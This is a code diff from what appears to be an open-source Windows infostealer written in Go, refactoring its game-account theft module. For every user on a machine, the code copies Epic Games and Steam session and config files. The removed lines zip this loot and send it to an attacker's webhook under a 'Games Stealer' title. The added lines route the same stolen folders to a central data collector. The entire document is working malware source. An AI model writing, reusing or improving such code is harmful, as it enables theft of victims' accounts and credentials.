@@ -4,13 +4,13 @@ import (
 	"fmt"
 	"github.com/hackirby/skuld/utils/fileutil"
 	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/hackirby/skuld/utils/collector"
 	"os"
 	"path/filepath"
 	"strings"
 )
 
-func Run(webhook string) {
+func Run(dataCollector *collector.DataCollector) {
 	for _, user := range hardware.GetUsers() {
 		paths := map[string]map[string]string{
 			"Epic Games": {
@@ -80,24 +80,15 @@ func Run(webhook string) {
 			continue
 		}
 
-		tempZip := filepath.Join(os.TempDir(), "games.zip")
-
-		if err := fileutil.Zip(tempDir, tempZip); err != nil {
-			os.RemoveAll(tempDir)
-			continue
+		// Add games data to collector
+		gamesInfo := map[string]interface{}{
+			"User":       strings.Split(user, "\\")[2],
+			"GamesFound": found,
 		}
-
-		requests.Webhook(webhook, map[string]interface{}{
-			"embeds": []map[string]interface{}{
-				{
-					"title":       "Games Stealer - " + strings.Split(user, "\\")[2],
-					"description": "```" + found + "```",
-				},
-			},
-		}, tempZip)
+		dataCollector.AddData("games", gamesInfo)
+		dataCollector.AddDirectory("games", tempDir, fmt.Sprintf("games_%s", strings.Split(user, "\\")[2]))
 
 		os.RemoveAll(tempDir)
-		os.Remove(tempZip)
 	}
 
 	tempDir := fmt.Sprintf("%s\\%s", os.TempDir(), "steam-temp")
@@ -112,18 +103,10 @@ func Run(webhook string) {
 		return
 	}
 
-	tempZip := filepath.Join(os.TempDir(), "steam.zip")
-	if err := fileutil.Zip(tempDir, tempZip); err != nil {
-		return
+	// Add Steam data to collector
+	steamInfo := map[string]interface{}{
+		"Status": "Steam config found and collected",
 	}
-	defer os.Remove(tempZip)
-
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{
-			{
-				"title":       "Steam",
-				"description": "`✅✅✅`",
-			},
-		},
-	}, tempZip)
+	dataCollector.AddData("steam", steamInfo)
+	dataCollector.AddDirectory("steam", tempDir, "steam_config")
 }
